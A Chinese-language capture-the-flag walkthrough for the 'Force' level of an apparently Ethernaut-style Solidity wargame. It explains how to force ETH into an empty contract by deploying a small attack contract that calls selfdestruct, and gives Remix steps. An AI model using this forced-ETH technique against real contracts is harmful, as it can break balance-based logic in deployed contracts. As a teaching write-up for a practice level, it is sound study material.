### 第八关 Force
### 难度3/5
## 这一关的通关条件是合约的余额大于零。
## 代码如下：
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
这个合约里面什么都没有，全是注释(有一只猫)。通关条件是使合约的余额大于0。一个合约要接受ETH，有这几种方法：
1. 合约里有一个payable修饰的函数。
2. 合约里有一个receive函数。
3. 有payable修饰的fallback函数。
4. 通过selfdestruct函数。
这道题很显然使用方法四来解。selfdestruct的作用是将合约从区块链上移除，清除其代码和存储数据，释放存储空间，将合约中剩余的 ETH 转到指定的接收地址。所以我们只需要新建一个攻击合约，调用selfdestruct，发送给Force合约。值得注意的是：“selfdestruct” 已被弃用。请注意，从坎昆硬分叉开始，底层操作码不再删除与账户关联的代码和数据，而只会将其中的 Ether 转移给受益人，除非在创建合约的同一笔交易中执行（参见 EIP-6780）。即使考虑到新的行为，也强烈建议不要在新部署的合约中使用。EVM 未来的变更可能会进一步削弱该操作码的功能。
## 解题步骤：
1. 打开remix线上编辑器,新建攻击合约：
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    uint public balance = 0;

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

    function acceptETH() external payable {
        balance += msg.value;
    }
}
```
2. 部署合约，调用acceptETH函数，发送一些ETH给合约(在Remix的“Deploy & Run”面板，填写value)。
3. 调用destruct合约，参数送入levelInstance地址。
4. 提交过关。
